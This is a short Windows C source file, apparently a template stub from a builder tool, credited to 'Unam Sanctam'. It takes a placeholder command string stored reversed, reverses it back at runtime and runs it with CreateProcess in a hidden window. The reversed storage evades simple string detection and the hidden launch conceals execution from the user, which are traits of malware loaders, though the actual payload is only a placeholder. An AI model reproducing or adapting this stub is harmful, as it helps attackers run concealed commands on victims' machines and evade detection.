#include <windows.h>

/* Created by Unam Sanctam, https://github.com/UnamSanctam */

void inplace_rev( char * s ) {
  char t, *e = s + strlen(s);
  while ( --e > s ) { t = *s;*s++=*e;*e=t; }
}

int main(int argc, char **argv) 
{
	  PROCESS_INFORMATION p_info;
	  STARTUPINFO s_info;

	  memset(&s_info, 0, sizeof(s_info));
	  memset(&p_info, 0, sizeof(p_info));
	  s_info.cb = sizeof(s_info);
	  
	  char commands[] = "#COMMAND";
	  
	  inplace_rev(commands);

	  if (CreateProcess(NULL, commands, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info))
	  {
		WaitForSingleObject(p_info.hProcess, INFINITE);
		CloseHandle(p_info.hProcess);
		CloseHandle(p_info.hThread);
	  }
	return 0;
}
